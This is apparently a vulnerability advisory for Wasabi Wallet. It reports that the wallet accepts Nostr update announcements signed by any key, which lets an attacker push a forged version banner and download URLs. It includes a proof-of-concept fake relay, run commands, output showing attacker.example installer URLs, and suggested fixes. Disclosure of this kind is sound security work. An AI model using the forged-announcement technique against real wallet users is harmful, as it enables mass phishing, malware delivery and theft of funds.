# Wasabi Wallet accepts Nostr release announcements from ANY signer, allowing forged update notifications with attacker-controlled download URLs

### Summary

Wasabi Wallet discovers new software releases by subscribing to a Nostr relay for kind-1 events "authored by" the Wasabi team npub. However, the client **never verifies that a received event was actually signed by that key**. The Nostr subscription `authors` filter is enforced only by the relay (an untrusted third party), and NNostr.Client verifies each event's BIP-340 signature against the event's *own embedded pubkey* — not against the subscribed author. Wasabi's `WasabiNostrClient` performs no additional identity check.

As a result, **any Nostr event validly signed by ANY key** that reaches the client (via any of the configured relays, a malicious/compromised relay, or a network attacker who can redirect one relay connection — only 1 of 3 relays needs to deliver the event) is treated as an official Wasabi release announcement. The attacker controls the announced version number and all download URLs. Every affected client then displays a "new version available" banner pointing to attacker infrastructure, and with default settings auto-downloads the attacker-served payload.

### Details

Data flow (master `154c4a5`):

1. `WalletWasabi.Fluent.Desktop/Program.cs` / `WalletWasabi.Daemon/Global.cs` (~line 508-523) builds a `CompositeNostrClient` over 3 hardcoded relays and calls `WasabiNostrClient.StartAsync()`, subscribing with filter `{ authors: [Constants.WasabiTeamNostrPubKey], kinds: [1], limit: 1 }`.
2. `WalletWasabi/WebClients/WasabiNostrClient.cs` `OnNostrEventsReceived` (lines 54-81) handles incoming events. It parses tags (`version`, `SHA256SUMS`, per-platform installer URLs) and raises `NewSoftwareVersionAvailable` — **without ever comparing `nostrEvent.PublicKey` to `Constants.WasabiTeamNostrPubKey`** and without re-verifying the event itself.
3. NNostr.Client 0.0.54 `HandleIncomingMessage` does call `NostrEvent.Verify()` (id = SHA256 of the NIP-01 preimage, BIP-340 signature check) — but verification is against the pubkey *inside the event*. An attacker simply generates their own keypair, signs a well-formed event, and it passes all checks. NNostr also does not enforce the subscription's `authors` filter client-side; that filter is only a request to the relay, which a malicious relay ignores.
4. `CompositeNostrClient` raises `EventsReceived` from whichever relay sends an event first — there is no quorum/agreement requirement across the 3 relays.
5. `Services/UpdateManager.cs` consumes the event: `NewSoftwareVersionAvailable` fires the UI banner immediately (independent of download), and unless the user disabled it, the update is auto-downloaded from the attacker-supplied URLs. There is also no sanity bound on the announced version (any version string is accepted, `UpdateManager.cs` ~72-85).

The installer binary itself is still gated by an ECDSA signature check of `SHA256SUMS.wasabisig` against the hardcoded `WasabiPubKey` (`UpdateManager.cs` ~220-239), so silent installation of an unsigned binary is prevented — but the attacker fully controls the banner, the version, and every URL the client fetches, enabling large-scale phishing (fake "critical security update" → malicious site), and the download/verification flow itself can be abused (e.g. serving a validly-signed *old* installer with known vulnerabilities — a downgrade/rollback vector, since arbitrary version strings are accepted).

### PoC

Repository: `poc-nostr-forgery/` (attached). It uses the **production** `WasabiNostrClient` + `CompositeNostrClient` from `WalletWasabi.csproj`, wired exactly as `Global.cs` wires them, against a local malicious relay.

- `FakeRelay/` — minimal NIP-01 WebSocket relay (`ws://127.0.0.1:7777`). On `REQ` it logs the client's `authors` filter (the Wasabi team pubkey `516e1c38...becb051`), then replies with a kind-1 event **validly signed (correct NIP-01 id + BIP-340 Schnorr signature) by an unrelated attacker keypair** (`1b84c556...dd078f`), carrying `version = 99.99.99` and `http://attacker.example/...` URLs for every installer artifact.
- `Poc/` — subscribes via production `WasabiNostrClient` and prints what the client accepted.

Run (requires .NET 10 SDK):

```
dotnet run --project FakeRelay &   # terminal 1
dotnet run --project Poc           # terminal 2
```

Observed output:

```
[RELAY] REQ: ["REQ","...",{"authors":["516e1c3891bfb97089c25c35c5d96a0d20bf7d35004418b55278742a6becb051"],"kinds":[1],"limit":1}]
[RELAY] replying with event signed by ATTACKER key 1b84c5567b126440995d3ed5aaba0565d71e1834604819ff9c17f5e9d5dd078f instead
[POC] WasabiNostrClient ACCEPTED the forged event:
      Version = 99.99.99
      Download URLs supplied by attacker:
        Wasabi-99.99.99.msi -> http://attacker.example/wasabi/Wasabi-99.99.99.msi
        ... (all artifacts)
[POC] VULNERABLE: a single relay injection puts an arbitrary
      'new version' banner + attacker URLs into every Wasabi client.
```

The event passes NNostr's `Verify()` (valid id + valid BIP-340 signature) and is delivered to `OnNostrEventsReceived`, which accepts it — proving the missing signer-identity check is the root cause, not relay misbehavior or signature validation.

### Impact

Unauthenticated remote attacker (anyone able to publish to or operate one of the configured Nostr relays, or intercept one relay connection) can push a forged "new Wasabi version" announcement to all Wasabi clients, with attacker-controlled version and download URLs. Consequences:

- **Mass phishing / malware distribution:** every client shows an official-looking update banner; default config auto-downloads from attacker URLs. Users who then manually run the downloaded installer (or who are tricked by a fake update page) are fully compromised — direct theft of wallet funds.
- **Downgrade/rollback:** arbitrary version strings are accepted, so an attacker can announce a high version while serving a legitimately-signed old installer with known vulnerabilities, bypassing the ECDSA gate.
- **Integrity of the update channel is reduced to "any valid Nostr signature"** — the Wasabi team key provides zero protection.

All Wasabi Wallet versions using Nostr-based update discovery are affected (mechanism present on master `154c4a5`).

### Suggested fixes

1. In `WasabiNostrClient.OnNostrEventsReceived`, drop any event whose `PublicKey` != `Constants.WasabiTeamNostrPubKey` (constant-time compare), and re-verify id + BIP-340 signature client-side rather than relying on the library/relay.
2. Require agreement (quorum, e.g. 2-of-3) across relays in `CompositeNostrClient` before accepting an announcement.
3. Allow-list download URL hosts (e.g. `wasabiwallet.io`, GitHub releases) in `UpdateManager`.
4. Reject announced versions <= current version (anti-rollback) and cap absurd version jumps.
5. Add a regression test: event validly signed by a non-team key must be ignored.
